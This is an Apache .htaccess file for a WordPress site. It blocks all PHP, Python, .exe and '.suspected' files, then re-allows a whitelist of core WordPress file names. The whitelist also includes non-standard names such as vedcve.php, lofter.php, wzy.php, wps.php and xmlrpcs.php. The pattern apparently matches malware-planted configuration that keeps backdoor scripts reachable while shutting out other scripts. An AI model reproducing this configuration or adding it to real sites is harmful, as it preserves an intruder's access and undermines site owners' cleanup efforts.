<FilesMatch ".(PhP|php5|suspected|phtml|py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "^(index.php|wp-blog-header.php|wp-config-sample.php|wp-login.php|wp-settings.php|wp-trackback.php|wp-activate.php|wp-comments-post.php|wp-cron.php|wp-load.php|wp-mail.php|wp-signup.php|xmlrpc.php|edit-form-advanced.php|options-writing.php|themes.php|admin-ajax.php|edit-form-comment.php|link.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scripts.php|edit.php|load-styles.php|plugins.php|admin-header.php|edit-tag-form.php|media-new.php|my-sites.php|post-new.php|admin.php|edit-tags.php|media.php|nav-menus.php|post.php|admin-post.php|export.php|media-upload.php|network.php|press-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|user-edit.php|menu.php|options-general.php|profile.php|user-new.php|options-head.php|revision.php|users.php|custom-background.php|ms-admin.php|options-media.php|setup-config.php|widgets.php|custom-header.php|ms-delete-site.php|options-permalink.php|term.php|customize.php|link-add.php|options.php|edit-comments.php|link-manager.php|options-reading.php|plugin-install.php|update.php|tools.php|import.php|site-health.php|export-personal-data.php|erase-personal-data.php|options-privacy.php|wp_blog.php|wp_cron.php|wp.php|vedcve.php|thems.php|loads.php|jsdindex.php|load.php|xmlrpcs.php|wp-login.php|lofter.php|wp-crons.php|wp-load.php|repeater.php|wp-scripts.php|use.php|locale.php|wzy.php|wps.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>